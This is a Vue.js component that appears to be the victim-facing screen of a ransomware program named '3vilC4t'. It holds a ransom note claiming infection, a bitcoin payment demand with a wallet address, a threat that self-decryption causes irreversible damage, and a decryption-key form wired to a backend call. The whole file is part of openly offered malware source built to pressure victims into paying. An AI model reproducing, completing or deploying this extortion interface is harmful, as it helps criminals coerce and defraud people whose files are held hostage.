<template>
  <div class="container">
    <h1>{{message}}</h1>
    <img alt="3vilC4t" src="../assets/images/logo.png" class="logo zoomIn">
    <p :title="message2">{{message2}}</p>
    <p :title="address">{{address}}</p>
    <input type="text" id="decKey" name="decKey" v-model="decKey" placeholder="Decryption Key">
    <a @click="DecryptSystemCall">Decrypt</a>
    <p>KeyID: {{keyID}}</p>
    <p>{{finishMsg}}</p>
  </div>
</template>

<script>
export default {
  data() {
    return {
      message: "You have been infected by 3vilC4t virus.",
      message2: "Pay the ransom to receive the decryption key. You have 1 attempt. Do not attempt to decrypt the files on your own. It will cause irreversible damage. A copy of this message is saved to your deskop in a README.PWN text file. There are numerous guides online on how to purchase bitcoin.",
      address: "0.0048 BTC to mjD6LE6rK9cGSrWmuTK5haFULEUUyceakf ",
      decKey: "",
      keyID: "",
      finishMsg: ""
    };
  },
  methods: {
    DecryptSystemCall: function() {
      window.backend.DecryptSystemWrapper(this.decKey).then(result => {
        this.finishMsg = result;
      })
    }
  },
  beforeMount() {
    this.getKeyID().then(result => {
      this.keyID = result
    })
  }
};
</script>

<!-- Add "scoped" attribute to limit CSS to this component only -->
<style scoped>
h1 {
  margin-top: 2em;
  position: relative;
  min-height: 5rem;
  width: 100%;
}
a:hover {
  font-size: 1.4em;
  border-color: #77079d;
  background-color: #77079d;
  color: white;
  border: 3px solid white;
  border-radius: 10px;
  padding: 9px;
  cursor: pointer;
  transition: 500ms;
}
a {
  font-size: 1.1em;
  border-color: #77079d;
  background-color: #121212;
  color: #77079d;
  border: 3px solid #77079d;
  border-radius: 10px;
  padding: 9px;
  cursor: pointer;
}
</style>
